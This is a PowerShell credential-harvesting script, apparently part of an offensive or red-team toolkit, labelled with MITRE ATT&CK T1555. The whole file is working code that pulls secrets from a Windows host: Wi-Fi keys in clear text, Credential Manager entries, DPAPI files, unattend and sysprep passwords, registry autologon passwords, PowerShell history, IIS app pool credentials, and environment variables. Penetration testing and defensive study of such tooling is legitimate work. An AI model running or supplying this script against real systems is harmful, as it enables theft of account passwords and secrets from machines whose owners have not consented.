# gather/windows/enum-credentials.ps1 — Credential harvesting from common stores
# Requires: Current user context (some items need admin)
# Read-only: YES
# MITRE ATT&CK: T1555 — Credentials from Password Stores

Write-Output "=== CREDENTIAL MANAGER ==="
cmdkey /list 2>$null

Write-Output ""
Write-Output "=== WIFI PROFILES ==="
$profiles = netsh wlan show profiles 2>$null | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[-1].Trim() }
foreach ($p in $profiles) {
    Write-Output "--- $p ---"
    netsh wlan show profile name="$p" key=clear 2>$null | Select-String "Key Content"
}

Write-Output ""
Write-Output "=== DPAPI MASTER KEYS ==="
$paths = @(
    "$env:APPDATA\Microsoft\Credentials",
    "$env:LOCALAPPDATA\Microsoft\Credentials",
    "$env:APPDATA\Microsoft\Protect"
)
foreach ($path in $paths) {
    if (Test-Path $path) {
        Write-Output "--- $path ---"
        Get-ChildItem $path -Recurse -Force 2>$null | Select-Object FullName, Length, LastWriteTime
    }
}

Write-Output ""
Write-Output "=== UNATTEND / SYSPREP FILES ==="
$unattendPaths = @(
    "C:\unattend.xml", "C:\Windows\Panther\unattend.xml",
    "C:\Windows\Panther\Unattend\unattend.xml",
    "C:\Windows\system32\sysprep\sysprep.xml",
    "C:\Windows\system32\sysprep\unattend.xml"
)
foreach ($f in $unattendPaths) {
    if (Test-Path $f) {
        Write-Output "[+] FOUND: $f"
        Select-String -Path $f -Pattern "Password|UserName|AdminPassword" 2>$null
    }
}

Write-Output ""
Write-Output "=== AUTOLOGON ==="
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
$autoUser = (Get-ItemProperty $regPath -Name "DefaultUserName" -ErrorAction SilentlyContinue).DefaultUserName
$autoPass = (Get-ItemProperty $regPath -Name "DefaultPassword" -ErrorAction SilentlyContinue).DefaultPassword
$autoDom = (Get-ItemProperty $regPath -Name "DefaultDomainName" -ErrorAction SilentlyContinue).DefaultDomainName
if ($autoUser) { Write-Output "[+] AutoLogon: $autoDom\$autoUser : $autoPass" }

Write-Output ""
Write-Output "=== POWERSHELL HISTORY ==="
$users = Get-ChildItem "C:\Users" -Directory -Force 2>$null
foreach ($u in $users) {
    $hist = "$($u.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $hist) {
        Write-Output "--- $($u.Name) PS history (last 30) ---"
        Get-Content $hist -Tail 30 2>$null | Select-String -Pattern "pass|secret|token|key|cred|ConvertTo-SecureString" 
    }
}

Write-Output ""
Write-Output "=== IIS APP POOL CREDS ==="
if (Test-Path "$env:SystemRoot\system32\inetsrv\appcmd.exe") {
    & "$env:SystemRoot\system32\inetsrv\appcmd.exe" list apppool /text:* 2>$null | Select-String "userName|password"
}

Write-Output ""
Write-Output "=== SCHEDULED TASK CREDENTIALS ==="
schtasks /query /fo LIST /v 2>$null | Select-String "TaskName|Run As User" | Select-Object -First 40

Write-Output ""
Write-Output "=== ENVIRONMENT VARIABLES (secrets) ==="
Get-ChildItem env: 2>$null | Where-Object { $_.Name -match "pass|secret|token|key|api" -and $_.Name -notmatch "^Path$" } | Format-Table Name, Value
